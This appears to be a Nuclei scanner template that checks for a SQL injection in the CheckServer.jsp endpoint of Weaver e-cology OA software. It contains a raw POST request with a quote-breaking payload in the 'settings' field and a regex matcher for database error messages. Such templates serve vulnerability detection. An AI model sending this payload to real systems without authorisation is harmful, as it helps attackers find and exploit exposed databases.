id: weaver-ecology-checkserver-sqli
info:
  name: Weaver e-cology CheckServer.jsp SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Weaver e-cology OA has an SQL injection vulnerability in the CheckServer.jsp endpoint, allowing attackers to access database information or gain higher privileges through malicious SQL queries.
  reference:
    - https://www.weaver.com.cn
  tags: sql-injection
http:
  - raw:
      - |
        POST /mobile/plugin/CheckServer.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 219
        Origin: null
        Connection: close

        type=mobilesetting&settings=[{"scope":"222","modulename":"222%27222%27222","module":"2","setting":"test'test|1|2|,24|0#%E9%83%A8%E9%97%A8%E9%80%9A%E7%9F%A5|2|2|,25|0#%E4%B8%9A%E5%8A%A1%E5%85%AC%E5%91%8A|3|2|,62|0"}]
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "(?i)(error|syntax|sql|database)"
        part: body
